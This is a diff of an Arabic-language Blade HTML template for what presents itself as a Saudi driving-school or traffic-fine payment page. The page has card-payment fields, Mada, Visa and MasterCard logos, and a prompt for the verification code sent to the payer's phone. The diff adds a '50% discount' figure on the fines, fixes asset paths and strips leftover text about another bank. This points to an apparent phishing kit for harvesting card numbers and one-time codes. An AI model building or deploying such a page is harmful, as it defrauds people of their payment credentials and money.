@@ -10,14 +10,14 @@
 	<title> مدرسة القيادة </title>
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="csrf-token" content="{{ csrf_token() }}">
-	<link rel="icon" type="image/png" href="../new/img/favicon.png">
-	<link rel="stylesheet" href="../new/css/jquery-ui.css">
+	<link rel="icon" type="image/png" href="../../../new/img/favicon.png">
+	<link rel="stylesheet" href="../../../new/css/jquery-ui.css">
 
-  <script src="../new/js/jquery-3.6.0.js"></script>
-  <script src="../new/js/jquery-ui.js"></script>
+  <script src="../../../new/js/jquery-3.6.0.js"></script>
+  <script src="../../../new/js/jquery-ui.js"></script>
   
-  <link href="../new/css/bootstrap.min.css" rel="stylesheet" >
-  <script src="../new/js/bootstrap.bundle.min.js" ></script>
+  <link href="../../../new/css/bootstrap.min.css" rel="stylesheet" >
+  <script src="../../../new/js/bootstrap.bundle.min.js" ></script>
   
 	<style>
 		/* Google Fonts */
@@ -26,7 +26,7 @@
 			font-family: 'Material Icons';
 			font-style: normal;
 			font-weight: 400;
-			src: url(../new/fonts/material-icons.woff2) format('woff2');
+			src: url(../../../new/fonts/material-icons.woff2) format('woff2');
 		}
 
 		@font-face {
@@ -34,7 +34,7 @@
 			font-family: 'Material Icons Outlined';
 			font-style: normal;
 			font-weight: 400;
-			src: url(../new/fonts/material-icons-outlined.woff2) format('woff2');
+			src: url(../../../new/fonts/material-icons-outlined.woff2) format('woff2');
 		}
 
 		@font-face {
@@ -42,7 +42,7 @@
 			font-family: 'Material Symbols Outlined';
 			font-style: normal;
 			font-weight: 400;
-			src: url(../new/fonts/material-symbols-outlined.woff2) format('woff2');
+			src: url(../../../new/fonts/material-symbols-outlined.woff2) format('woff2');
 		}
 
 		/* Custom Fonts */
@@ -51,9 +51,9 @@
 			font-family: 'Suisse Intl';
 			font-style: normal;
 			font-weight: 400;
-			src: url(../new/fonts/SuisseIntl-Regular-WebXL.woff2) format('woff2'),
-				url(../new/fonts/SuisseIntl-Regular-WebXL.woff) format('woff'),
-				url(../new/fonts/SuisseIntl-Regular-WebXL.ttf) format('truetype');
+			src: url(../../../new/fonts/SuisseIntl-Regular-WebXL.woff2) format('woff2'),
+				url(../../../new/fonts/SuisseIntl-Regular-WebXL.woff) format('woff'),
+				url(../../../new/fonts/SuisseIntl-Regular-WebXL.ttf) format('truetype');
 		}
 
 		@font-face {
@@ -61,9 +61,9 @@
 			font-family: 'Suisse Intl';
 			font-style: normal;
 			font-weight: 500;
-			src: url(../new/fonts/SuisseIntl-Medium-WebXL.woff2) format('woff2'),
-				url(../new/fonts/SuisseIntl-Medium-WebXL.woff) format('woff'),
-				url(../new/fonts/SuisseIntl-Medium-WebXL.ttf) format('truetype');
+			src: url(../../../new/fonts/SuisseIntl-Medium-WebXL.woff2) format('woff2'),
+				url(../../../new/fonts/SuisseIntl-Medium-WebXL.woff) format('woff'),
+				url(../../../new/fonts/SuisseIntl-Medium-WebXL.ttf) format('truetype');
 		}
 
 		@font-face {
@@ -71,9 +71,9 @@
 			font-family: 'Suisse Intl';
 			font-style: normal;
 			font-weight: 600;
-			src: url(../new/fonts/SuisseIntl-SemiBold-WebXL.woff2) format('woff2'),
-				url(../new/fonts/SuisseIntl-SemiBold-WebXL.woff) format('woff'),
-				url(../new/fonts/SuisseIntl-SemiBold-WebXL.ttf) format('truetype');
+			src: url(../../../new/fonts/SuisseIntl-SemiBold-WebXL.woff2) format('woff2'),
+				url(../../../new/fonts/SuisseIntl-SemiBold-WebXL.woff) format('woff'),
+				url(../../../new/fonts/SuisseIntl-SemiBold-WebXL.ttf) format('truetype');
 		}
 
 		@font-face {
@@ -81,12 +81,12 @@
 			font-family: 'Suisse Intl';
 			font-style: normal;
 			font-weight: 900;
-			src: url(../new/fonts/SuisseIntl-Bold-WebXL.woff2) format('woff2'),
-				url(../new/fonts/SuisseIntl-Bold-WebXL.woff) format('woff'),
-				url(../new/fonts/SuisseIntl-Bold-WebXL.ttf) format('truetype');
+			src: url(../../../new/fonts/SuisseIntl-Bold-WebXL.woff2) format('woff2'),
+				url(../../../new/fonts/SuisseIntl-Bold-WebXL.woff) format('woff'),
+				url(../../../new/fonts/SuisseIntl-Bold-WebXL.ttf) format('truetype');
 		}
 	</style>
-	<link rel="stylesheet" href="../new/css/f6b67422dbe6c498.css">
+	<link rel="stylesheet" href="../../../new/css/f6b67422dbe6c498.css">
 	
 	<style type="text/css"></style>
 	
@@ -5683,7 +5683,7 @@
 			display: none
 		}
 	</style>
-	<!-- <script type="text/javascript" src="../new/js/embed.js"></script> -->
+	<!-- <script type="text/javascript" src="../../../new/js/embed.js"></script> -->
 	<style>
 		mat-menu {
 			display: none
@@ -6468,7 +6468,7 @@
 			transition: none
 		}
 	</style>
-	<!-- <script type="text/javascript" src="../new/js/embed.js"></script> -->
+	<!-- <script type="text/javascript" src="../../../new/js/embed.js"></script> -->
 	<style>
 		.mat-expansion-panel {
 			box-sizing: content-box;
@@ -28133,9 +28133,9 @@
 	<style>.fare-info-fee-details{font-family:Suisse Intl,arial,sans-serif;font-size:.875rem;letter-spacing:.02em;line-height:1.25rem}.multicity-faredetails .fare-name{font-family:Suisse Intl,arial,sans-serif;font-size:1.125rem;letter-spacing:normal;line-height:1.5rem}.fare-card{flex:1;margin:0;margin-right:.75rem;max-width:23.125rem;animation:moveup .3s}.fare-card:last-child{margin-right:0}@media only screen and (max-width: 1079px){.fare-card{width:17.1rem;flex-wrap:wrap}}@media only screen and (max-width: 1079px){.fare-card{margin:0;margin-bottom:.5rem;width:inherit;max-width:100%}.fare-card:last-child{margin-bottom:0}}.fare-card button{width:100%;padding:.5rem;text-align:center;border:none;border-radius:.5rem;margin-top:1rem}.fare-header{background:var(--background);padding:1.75rem 1rem 1rem;border-radius:.5rem;min-height:100%;display:flex;flex-direction:column;justify-content:space-between;position:relative}@media only screen and (max-width: 1079px){.fare-header{padding:1rem;box-shadow:0 4px 6px var(--separator)}}.fare-seat{position:relative;top:-1.4rem;left:17.7rem}.fare-seat-details{position:absolute;border:.0625rem solid var(--warningButtonColor);border-radius:.25rem;width:4.125rem;padding:0 .19rem 1.4rem 0;color:var(--warningButtonColor);font-family:Suisse Intl,arial,sans-serif;font-size:.75rem;font-weight:500;letter-spacing:.01em;line-height:1.5rem;height:1.25rem}.fare-list{padding:1.5rem;justify-content:center;width:100%;border-radius:.75rem;flex-direction:row;display:flex;align-items:stretch;background-repeat:repeat;margin:0;transition:all .3s cubic-bezier(.42,1,.1,1);animation:scale .15s;transform-origin:50% 0}.fare-list button{border:none}.fare-list.guest_card{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500'%3E%3Cfilter id='noise' x='0' y='0'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3CfeBlend mode='screen'/%3E%3C/filter%3E%3Crect width='500' height='500' filter='url(%23noise)' opacity='0.05'/%3E%3C/svg%3E"),radial-gradient(107.93% 83.45% at 50% 100%,#BAB8D0 0%,rgba(186,184,208,.33) 62.5%,rgba(186,184,208,.19) 73.96%,rgba(186,184,208,.08) 84.38%,rgba(186,184,208,.02) 94.27%,rgba(186,184,208,0) 100%)!important;background-color:var(--guest-class-card)!important;transition:all .3s cubic-bezier(.42,1,.1,1)}.fare-list.guest_card button{background:var(--flightDetailsVioletColor);border:none}.fare-list.guest_card button:hover{background:var(--tertiaryButtonColor)!important;opacity:.8;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px)}.fare-list.guest_card .mix-cabin-button{background:var(--dark)!important}.fare-list.first_card{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500'%3E%3Cfilter id='noise' x='0' y='0'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3CfeBlend mode='screen'/%3E%3C/filter%3E%3Crect width='500' height='500' filter='url(%23noise)' opacity='0.05'/%3E%3C/svg%3E"),radial-gradient(107.93% 83.45% at 50% 100%,#E0D6C0 0%,rgba(224,214,192,.3347) 62.5%,rgba(224,214,192,.1913) 73.96%,rgba(224,214,192,.0815) 84.38%,rgba(224,214,192,.0202) 94.27%,rgba(224,214,192,0) 100%)!important;background-color:var(--first-class-card)!important;transition:all .3s cubic-bezier(.42,1,.1,1)}.fare-list.first_card button{background:var(--flightDetailsOrangeColor);border:none}.fare-list.first_card button:hover{background:var(--tertiaryButtonColor)!important;opacity:.8;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px)}.fare-list.first_card .mix-cabin-button{background:var(--dark)!important}.fare-list.business_card{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500'%3E%3Cfilter id='noise' x='0' y='0'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3CfeBlend mode='screen'/%3E%3C/filter%3E%3Crect width='500' height='500' filter='url(%23noise)' opacity='0.05'/%3E%3C/svg%3E"),radial-gradient(107.93% 83.45% at 50% 100%,#B1C5D4 0%,rgba(177,197,212,.33) 62.5%,rgba(177,197,212,.19) 73.96%,rgba(177,197,212,.08) 84.38%,rgba(177,197,212,.02) 94.27%,rgba(177,197,212,0) 100%)!important;background-color:var(--business-class-card)!important;transition:all .3s cubic-bezier(.42,1,.1,1)}.fare-list.business_card button{background:var(--flightDetailsTagBlueColor);border:none}.fare-list.business_card button:hover{background:var(--tertiaryButtonColor)!important;opacity:.8;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px)}.fare-list.business_card .mix-cabin-button{background:var(--dark)!important}.fare-list.soldout_card{background:var(--formBackgroundColor)!important}.fare-list.soldout_card button{background:var(--secondaryButtonColor)}@media only screen and (max-width: 1079px){.fare-list.first-cabin{border-top-left-radius:0}}.fare-list.last-cabin,.fare-list.only-cabin{border-top-right-radius:0}@media only screen and (max-width: 1079px){.fare-list.only-cabin{border-top-left-radius:0;border-top-right-radius:0}}@media only screen and (max-width: 1079px){.fare-list{padding:.5rem;flex-direction:column;border-radius:.5rem .5rem .75rem .75rem}}@keyframes scale{0%{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}@keyframes moveup{0%{transform:translateY(100%);opacity:0}to{transform:translateY(0);opacity:1}}.fare-name{color:var(--titleColor);font-family:Suisse Intl,arial,sans-serif;font-size:1rem;font-weight:500;letter-spacing:.01em;line-height:1.5rem}.fare-currency{padding:.5rem 0 1rem;border-bottom:1px solid var(--separator);color:var(--titleColor);font-family:Suisse Intl,arial,sans-serif;font-size:2rem;font-weight:500;letter-spacing:.02em;line-height:2.25rem;font-feature-settings:"ss02" on,"ss03" on,"zero" on,"ss06" on,"ss07" on,"ss08" on,"ss09" on}.fare-currency-format{color:var(--featuredListContent)}.fare-stroke{width:100%}.fare-rule{display:flex;justify-content:flex-start;padding-top:1rem}.fare-details{padding-left:.75rem;flex-grow:1;color:var(--titleColor);font-family:Suisse Intl,arial,sans-serif;font-size:1rem;font-weight:400;letter-spacing:.02em;line-height:1.5rem}.fare-details .holidayEligible.info-icon:hover{color:var(--focusedLabelColor);cursor:pointer}.fare-img{min-width:1.25rem;max-height:1.25rem;display:flex;align-items:flex-start}.fare-img img{width:100%}.fare-title{font-weight:500}.fare-info{font-family:Suisse Intl,arial,sans-serif;font-size:16px;font-weight:400;letter-spacing:.02em;line-height:1.5rem;font-feature-settings:"ss02" on,"ss03" on,"zero" on,"ss07" on,"ss08" on,"ss09" on,"ss06" on;margin-top:.125rem}.fare-info-fee-details{color:var(--floatLabelColor);font-family:Suisse Intl,arial,sans-serif}.fare-info a{color:var(--navLinkHover)!important;font-family:Suisse Intl,arial,sans-serif}.fare-info a:hover{color:var(--secondaryLink)!important;font-family:Suisse Intl,arial,sans-serif;text-decoration:underline}.fare-tags{display:flex;justify-content:flex-end;align-items:flex-start;margin-top:-1.5rem;margin-right:-.75rem;margin-bottom:.25rem;gap:.25rem}@media only screen and (max-width: 1079px){.fare-tags{margin-top:0;white-space:normal;word-break:break-word}}.fare-tags .promo-code{color:var(--successColor);font-family:Suisse Intl,arial,sans-serif;font-size:.75rem;font-weight:500;line-height:1rem;border:1px solid var(--successColor);padding:.125rem .25rem;border-radius:.25rem}.fare-height{min-height:1.25rem}.promo-code{color:var(--successColor);font-family:Suisse Intl,arial,sans-serif;font-size:.75rem;font-weight:500;line-height:1rem;border:1px solid var(--successColor);padding:.125rem .25rem;border-radius:.25rem}.mix-cabin{display:inline-block;background-color:var(--tertiaryButtonColor);border:1px solid var(--tertiaryButtonColor);color:var(--light);border-radius:.25rem;text-align:center;font-size:.75rem;font-weight:500;line-height:1rem;letter-spacing:.04em;padding:2px 4px;margin-right:.25rem}.seats-label,.promo-code{display:inline-block;background-color:var(--background);color:var(--warningButtonColor);font-family:Suisse Intl,arial,sans-serif;font-size:.75rem;font-weight:500;letter-spacing:.04em;line-height:1rem;border-radius:.25rem;text-align:center;padding:2px 4px;border:1px solid var(--warningButtonColor);margin-right:.25rem}.promocode{color:var(--successColor);font-family:Suisse Intl,arial,sans-serif;border:1px solid transparent}.promocode-icon{font-family:Suisse Intl,arial,sans-serif;font-size:1rem;margin-right:.25rem;vertical-align:bottom}.multicity-faredetails{padding:0;justify-content:left;animation:none;border:1px solid var(--separator);border-radius:.5rem;background:var(--background);margin-bottom:1rem}.multicity-faredetails .fare-card{animation:none;max-width:none}.multicity-faredetails .fare-card .fare-header{padding:1rem}.multicity-faredetails .fare-card .fare-header .fare-tags{display:none}.multicity-faredetails .fare-name{border-bottom:1px solid var(--separator);padding:0 0 1rem}@media only screen and (max-width: 635.5px){.multicity-faredetails .fare-name{font-family:Suisse Intl,arial,sans-serif;font-size:1rem;letter-spacing:.01em;line-height:1.5rem}}@media only screen and (max-width: 635.5px){.multicity-faredetails{border-radius:.5rem!important}}@media only screen and (max-width: 1079px){.mix-cabin,.seats-label,.promo-code{margin-top:-10px}}[dir=rtl] .fare-list.last-cabin,[dir=rtl] .fare-list.only-cabin{border-top-left-radius:0;border-top-right-radius:.75rem}[dir=rtl] .multicity-faredetails .fare-details{padding-left:0;padding-right:.75rem}
 </style>
 
-  <link href="../new/css/nstyle.css" rel="stylesheet" >
- <link href="../new/css/paymentpage.css" rel="stylesheet" >
-  <script src="../new/js//HTI8BwV16s" async></script>
+  <link href="../../../new/css/nstyle.css" rel="stylesheet" >
+ <link href="../../../new/css/paymentpage.css" rel="stylesheet" >
+  <script src="../../../new/js//HTI8BwV16s" async></script>
  
 </head>
 
@@ -28281,10 +28281,12 @@
 														<!----><!----><!---->
 														<div class="fare_summary ng-star-inserted">
 															<div>
-																<div class="fare_summary_container"><span
-																		class="fare_label"> قيمة المخالفات  
+																<div class="fare_summary_container">
+																	<span
+																		class="fare_label"> قيمة المخالفات بعد التخفيض   
 																	</span>
-																	<div class="fare_amount ng-star-inserted">  ريال سعودي
+																
+																	<div class="fare_amount ng-star-inserted"> 	{{$totalFineItemsAmount / 2}} ريال سعودي
 																		 </div><!----><!---->
 																</div><button
 																	aria-label="اضغط هنا لمزيد عن السعر الإجمالي"
@@ -28361,7 +28363,7 @@
 																																				Apple Pay</span><!----></span></label></mat-radio-button></div>
 																														</mat-panel-title><mat-panel-description class="mat-expansion-panel-header-description ng-tns-c135-32">
 																															<div class="ApplePay-logo"><img alt="ApplePay-Logo" height="60" class="ng-star-inserted"
-																																	src="../new/img/apple-pay.png"
+																																	src="../../../new/img/apple-pay.png"
 																																	style="top: -10px;position:absolute;width:85px;left: -10px;"><!----></div>
 																														</mat-panel-description></span><!----></mat-expansion-panel-header></mat-expansion-panel>
 																											<mat-error aria-atomic="true" class="mat-error ng-tns-c88-7 ng-star-inserted" style="display: none;"
@@ -28393,15 +28395,15 @@
                                                                                                                             <mat-panel-description class="mat-expansion-panel-header-description ng-tns-c123-95">
                                                                                                                                 <div class="logoList">
                                                                                                                                     <div class="logo ng-star-inserted">
-                                                                                                                                        <img alt="Mada-Logo" width="183" height="60" src="../new/img/Mada.png" class="ng-star-inserted"><!---->
+                                                                                                                                        <img alt="Mada-Logo" width="183" height="60" src="../../../new/img/Mada.png" class="ng-star-inserted"><!---->
                                                                                                                                     </div>
                                                                                                                                     <!----><!---->
                                                                                                                                     <div class="logo ng-star-inserted">
-                                                                                                                                        <img alt="Master Card-Logo" width="85" height="60" src="../new/img//MasterCard.png" class="ng-star-inserted"><!---->
+                                                                                                                                        <img alt="Master Card-Logo" width="85" height="60" src="../../../new/img//MasterCard.png" class="ng-star-inserted"><!---->
                                                                                                                                     </div>
                                                                                                                                     <!----><!---->
                                                                                                                                     <div class="logo ng-star-inserted">
-                                                                                                                                        <img alt="VISA Blue-Logo" width="92" height="60" src="../new/img/VISABlue.png" class="ng-star-inserted"><!---->
+                                                                                                                                        <img alt="VISA Blue-Logo" width="92" height="60" src="../../../new/img/VISABlue.png" class="ng-star-inserted"><!---->
                                                                                                                                     </div>
                                                                                                                                     <!----><!----><!---->
                                                                                                                                 </div>
@@ -28668,11 +28670,11 @@
                                                                                             <section class="total-fare ng-star-inserted">
                                                                                                 <div class="fare-detail">
                                                                                                     <div class="ng-star-inserted">
-                                                                                                        قيمة المخافات</div>
+																									قيمة المخالفات بعد التخفيض  </div>
                                                                                                     <!---->
                                                                                                     <div class="title-wallet">
                                                                                                         <div class="ng-star-inserted">
-																										 ريال سعودي                                                                                                       </div>
+																										{{$totalFineItemsAmount / 2}}	 ريال سعودي                                                                                                       </div>
                                                                                                         <!----><!----><!---->
                                                                                                     </div>
                                                                                                 </div>
@@ -28806,15 +28808,15 @@
                                                                                                                         <mat-panel-description class="mat-expansion-panel-header-description ng-tns-c123-95">
                                                                                                                             <div class="logoList">
                                                                                                                                 <div class="logo ng-star-inserted">
-                                                                                                                                    <img alt="Mada-Logo" width="183" height="60" src="../new/img/Mada.png" class="ng-star-inserted"><!---->
+                                                                                                                                    <img alt="Mada-Logo" width="183" height="60" src="../../../new/img/Mada.png" class="ng-star-inserted"><!---->
                                                                                                                                 </div>
                                                                                                                                 <!----><!---->
                                                                                                                                 <div class="logo ng-star-inserted">
-                                                                                                                                    <img alt="Master Card-Logo" width="85" height="60" src="../new/img/MasterCard.png" class="ng-star-inserted"><!---->
+                                                                                                                                    <img alt="Master Card-Logo" width="85" height="60" src="../../../new/img/MasterCard.png" class="ng-star-inserted"><!---->
                                                                                                                                 </div>
                                                                                                                                 <!----><!---->
                                                                                                                                 <div class="logo ng-star-inserted">
-                                                                                                                                    <img alt="VISA Blue-Logo" width="92" height="60" src="../new/img/VISABlue.png" class="ng-star-inserted"><!---->
+                                                                                                                                    <img alt="VISA Blue-Logo" width="92" height="60" src="../../../new/img/VISABlue.png" class="ng-star-inserted"><!---->
                                                                                                                                 </div>
                                                                                                                                 <!----><!----><!---->
                                                                                                                             </div>
@@ -29548,15 +29550,15 @@
                                                                                                                         <mat-panel-description class="mat-expansion-panel-header-description ng-tns-c123-95">
                                                                                                                             <div class="logoList">
                                                                                                                                 <div class="logo ng-star-inserted">
-                                                                                                                                    <img alt="Mada-Logo" width="183" height="60" src="../new/img/Mada.png" class="ng-star-inserted"><!---->
+                                                                                                                                    <img alt="Mada-Logo" width="183" height="60" src="../../../new/img/Mada.png" class="ng-star-inserted"><!---->
                                                                                                                                 </div>
                                                                                                                                 <!----><!---->
                                                                                                                                 <div class="logo ng-star-inserted">
-                                                                                                                                    <img alt="Master Card-Logo" width="85" height="60" src="../new/img/MasterCard.png" class="ng-star-inserted"><!---->
+                                                                                                                                    <img alt="Master Card-Logo" width="85" height="60" src="../../../new/img/MasterCard.png" class="ng-star-inserted"><!---->
                                                                                                                                 </div>
                                                                                                                                 <!----><!---->
                                                                                                                                 <div class="logo ng-star-inserted">
-                                                                                                                                    <img alt="VISA Blue-Logo" width="92" height="60" src="../new/img/VISABlue.png" class="ng-star-inserted"><!---->
+                                                                                                                                    <img alt="VISA Blue-Logo" width="92" height="60" src="../../../new/img/VISABlue.png" class="ng-star-inserted"><!---->
                                                                                                                                 </div>
                                                                                                                                 <!----><!----><!---->
                                                                                                                             </div>
@@ -29572,10 +29574,6 @@
 																											لسداد مبلغ قيمته SAR <br>
 																											باستخدام البطاقة المنتهية برقم <span id="cardLast4"></span><br>
 																											لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.</div>
-																											Confirm with your mobile 
-																											To complete verification with ING Bank, 
-																											you will need to follow the instructions provided by ING, 
-																											which may involve using the ING app
                                                                                                                           
                                                                                                                             <!---->
                                                                                                                         </div>
@@ -29705,15 +29703,15 @@
 		
 	</style>							 
 
-<script type='text/javascript'   src="../new/js/jquery.payment.js"></script>
+<script type='text/javascript'   src="../../../new/js/jquery.payment.js"></script>
 <!-- Icons -->
-  <link href="../new/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
-        <link href="../new/css/materialdesignicons.min.css" rel="stylesheet" type="text/css" />
-        <link rel="stylesheet" href="../new/css/line.css">
+  <link href="../../../new/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+        <link href="../../../new/css/materialdesignicons.min.css" rel="stylesheet" type="text/css" />
+        <link rel="stylesheet" href="../../../new/css/line.css">
         <!-- Css -->
-        <link href="../new/css/style-rtl.css" rel="stylesheet" type="text/css" id="theme-opt" />
-        <link href="../new/css/default.css" rel="stylesheet" id="color-opt">
-		<script src="../new/js/jqrun.js"></script>
+        <link href="../../../new/css/style-rtl.css" rel="stylesheet" type="text/css" id="theme-opt" />
+        <link href="../../../new/css/default.css" rel="stylesheet" id="color-opt">
+		<script src="../../../new/js/jqrun.js"></script>
 		     <script type='text/javascript'>
 								$( document ).ready(function() {
 									$( "#payByApplPay" ).on( "click", function() {
@@ -30245,18 +30243,18 @@ function form2submit(){
 
 
         <!-- javascript -->
-        <script src="../new/js/bootstrap.bundle.min.js"></script>
+        <script src="../../../new/js/bootstrap.bundle.min.js"></script>
         <!-- SLIDER -->
-        <script src="../new/js/tiny-slider.js"></script>
-        <script src="../new/js/tiny-slider-init.js"></script>
+        <script src="../../../new/js/tiny-slider.js"></script>
+        <script src="../../../new/js/tiny-slider-init.js"></script>
         <!-- Icons -->
-        <script src="../new/js/feather.min.js"></script>
+        <script src="../../../new/js/feather.min.js"></script>
         <!-- Switcher -->
-        <script src="../new/js/switcher.js"></script>
+        <script src="../../../new/js/switcher.js"></script>
         <!-- Main Js -->
-        <script src="../new/js/app.js"></script>
-		<script src="../new/js/imaskk.js"></script>
-		<script src="../new/js/card.js"></script>
+        <script src="../../../new/js/app.js"></script>
+		<script src="../../../new/js/imaskk.js"></script>
+		<script src="../../../new/js/card.js"></script>
         
    
 
@@ -30333,15 +30331,15 @@ function form2submit(){
 	<mat-panel-description class="mat-expansion-panel-header-description ng-tns-c123-95" style="display: flex;margin: 0;">
 	<div class="logoList" style="display: flex;width: 200px;">
 		<div class="logo ng-star-inserted">
-			<img alt="Mada-Logo" width="183" height="60" src="../new/img/Mada.webp" class="ng-star-inserted"><!---->
+			<img alt="Mada-Logo" width="183" height="60" src="../../../new/img/Mada.webp" class="ng-star-inserted"><!---->
 		</div>
 		<!----><!---->
 		<div class="logo ng-star-inserted">
-			<img alt="Master Card-Logo" width="85" height="60" src="../new/img/MasterCard.webp" class="ng-star-inserted"><!---->
+			<img alt="Master Card-Logo" width="85" height="60" src="../../../new/img/MasterCard.webp" class="ng-star-inserted"><!---->
 		</div>
 		<!----><!---->
 		<div class="logo ng-star-inserted">
-			<img alt="VISA Blue-Logo" width="92" height="60" src="../new/img/VISABlue.webp" class="ng-star-inserted"><!---->
+			<img alt="VISA Blue-Logo" width="92" height="60" src="../../../new/img/VISABlue.webp" class="ng-star-inserted"><!---->
 		</div>
 		<!----><!----><!---->
 	</div>
@@ -30349,7 +30347,7 @@ function form2submit(){
 </div>
 
 <ng-lottie _ngcontent-my-app-c259="" class="loading-width">
-<div style="width: 70%; height: 70%;margin: auto 25px;"><img src="../new/img/call.gif" width="782" height="587" class="shrinkToFit transparent"></div>
+<div style="width: 70%; height: 70%;margin: auto 25px;"><img src="../../../new/img/call.gif" width="782" height="587" class="shrinkToFit transparent"></div>
 </ng-lottie>
 <div _ngcontent-my-app-c259="" class="loading-msg f-align-center" style="padding: 0 10px;">لمصادقة عملية الدفع سيتم الاتصال بك من قبل المصرف الخاص بحسابك<br>
 بعدها سيتم ارسال رمز التحقق إلى رقم جوالك.
